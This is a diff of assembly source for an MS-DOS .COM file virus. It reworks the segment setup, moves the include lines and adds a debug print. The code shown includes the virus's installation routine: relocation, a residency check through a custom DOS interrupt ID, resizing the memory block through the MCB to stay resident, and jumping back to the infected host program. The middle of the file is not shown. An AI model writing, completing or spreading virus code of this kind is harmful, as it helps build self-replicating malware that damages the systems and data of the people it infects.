@@ -1,31 +1,45 @@
 
 .model tiny
-include data.asm
-include Macro.asm ; the macro help Routines 
-include Functions.asm  
-.code
+;Tiny-model programs run only under MS-DOS. Tiny model places all data and code in a single segment.
+; Therefore, the total program file size can occupy no more than 64K.
+CODE_SEG SEGMENT
+ASSUME CS:CODE_SEG
+
+  
 ;defines where the machine code place in memory
 ;100H says that the machine code starts from address (offset) 100h in this segment ,For .com format the offset is always 100H
 ;Another example is ORG 7C00H for intel exe program format.
 org 100h 
-start:
+
+
+
    ;for debuging..
    ;mov dl,'A' ; print 'A'
    ;mov ah,2h
    ;int 21h
-    START:
+START:
 jmp INSTALL_VIRUS ;go to the installation routine
 
+include data.asm
+include Macro.asm ; the macro help Routines 
+include ProcRout.asm
 
 INSTALL_VIRUS:
 GetRelocation bp
 ;VIRUS RESIDENCY CHECK 
 mov ax, nVirusID
 int 21h
+
+SaveRegisters
+ mov dl,'A' ; print 'A'
+   mov ah,2h
+   int 21h
+RestoreRegisters
+   
 cmp bx, nVirusID ;virus are installed ?
 je VIRUS_ALREADY_INSTALLED
 ;RESIZE MEMORY BLOCK 
-mov ax, ds
+mov ax, ds ; data segment 
 dec ax
 mov es, ax ;get MCB
 ;----------------------------------------------------------------------------
@@ -117,7 +131,9 @@ mov bx, 100h
 push bx
 ret ;transfer to host program
 
+
 END_OF_CODE:
+CODE_SEG ENDS
 end start
 
 
